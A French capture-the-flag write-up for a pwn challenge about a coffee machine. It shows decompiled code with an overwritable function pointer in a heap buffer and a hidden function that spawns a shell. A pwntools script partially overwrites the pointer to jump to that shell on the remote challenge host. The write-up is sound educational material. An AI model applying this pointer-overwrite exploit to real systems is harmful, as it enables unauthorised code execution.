# Coffea break

## Énoncé

Notre cellule de crise vient de recevoir une archive interceptée par l'insaisissable Virginia Hall. Il s'agit du panneau de contrôle et du micrologiciel de la machine à café du bureau ovale ennemi.

Derrière cette interface banale se cache l'accès au réseau central. Virginia a réussi à y intégrer une routine d'accès dérobée, mais l'accès direct est verrouillé. Vous devez interagir avec le sélecteur de démarrage, adapter vos paramètres à la cible, et forcer le système à exécuter cette routine pour exfiltrer le flag.txt.

Trouverez-vous le bon dosage pour faire sauter les verrous ?

## Analyse

L'analyse de la fonction main sous Ghidra montre que le binaire `coffea_break` montre une vulnérabilité de corruption mémoire dans la fonction `main`:

```c
void main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  undefined4 local_14;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  do {
    menu();
    __isoc99_scanf(&DAT_0010207c,&local_14);
    getchar();
    switch(local_14) {
    default:
      puts("Invalid.");
      break;
    case 1:
      c = malloc(0x40028);
      builtin_strncpy(c,"Espresso",9);
      *(code **)(c + 0x20) = normal_drink;
      puts("Coffee ready.");
      break;
    case 2:
      if (c == (char *)0x0) {
        puts("No coffee.");
      }
      else {
        puts("New coffee recipe (espresso, latte, double espresso):");
        read(0,c,0x40);
        iVar1 = strncmp(c,"espresso",8);
        if (((iVar1 != 0) && (iVar1 = strncmp(c,"latte",5), iVar1 != 0)) &&
           (iVar1 = strncmp(c,"double espresso",0xf), iVar1 != 0)) {
          puts("Incorrect recipe.");
          free(c);
        }
      }
      break;
    case 3:
      if (c == (char *)0x0) {
        puts("No coffee.");
      }
      else {
        (**(code **)(c + 0x20))();
      }
      break;
    case 4:
      if (c == (char *)0x0) {
        puts("Nothing to throw.");
      }
      else {
        free(c);
        c = (char *)0x0;
        puts("Coffee thrown away.");
      }
      break;
    case 5:
      exit(0);
    }
  } while( true );
}
```
Dans le case 1 on a une allocation mémoire et un pointeur de fonction est écrit a l'offset `0x20`.

```c
c = malloc(0x40028);
builtin_strncpy(c,"Espresso",9);
*(code **)(c + 0x20) = normal_drink;
```

Le case 2 autorise ensuite une écriture de `0x40` octets dans cette zone. Si l'on choisit une recette valide comme espresso, la vérification ne libère pas le buffer, on peut donc corrompre le pointeur de fonction à l'offset `0x20` et l'écrasser.

```c
if (c == (char *)0x0) {
    puts("No coffee.");
}
else {
    puts("New coffee recipe (espresso, latte, double espresso):");
    read(0,c,0x40);
    iVar1 = strncmp(c,"espresso",8);
    if (((iVar1 != 0) && (iVar1 = strncmp(c,"latte",5), iVar1 != 0)) &&
        (iVar1 = strncmp(c,"double espresso",0xf), iVar1 != 0)) {
        puts("Incorrect recipe.");
        free(c);
    }
}
```

Enfin, le case 3 appelle directement le pointeur corrompu.

```c
else {
    (**(code **)(c + 0x20))();
}
```

Le binaire contient une fonction `secret` qui est la routine d'accès dérobée déposé par Virginia qui éxecute un shell :

```c
void secret(void)
{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  system("/bin/sh");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

## Adresses des fonctions

| Fonction       | Adresse      | 
| ---            | ---          |
| `secret`       | `0x001012a9` |
| `normal_drink` | `0x001012ea` |

## Exploitation

On doit donc :

1. Lancer le programme `launcher`.
2. Choisir le case 1 pour allouer et initialiser la structure.
3. Choisir le case 2 et ecraser le pointeur de fonction avec l'adresse de `secret`.
4. Choisir le case 3 pour declencher l'appel.


```python
from pwn import *

c = remote("57.128.112.118", 13808)
c.sendlineafter(b"> ", b"1")
c.sendlineafter(b"> ", b"1")
c.sendlineafter(b"> ", b"2")
c.recvuntil(b"double espresso):")
c.send(b"espresso" + b"A" * 24 + b"\xa9")
c.sendlineafter(b"> ", b"3")

c.interactive()
```
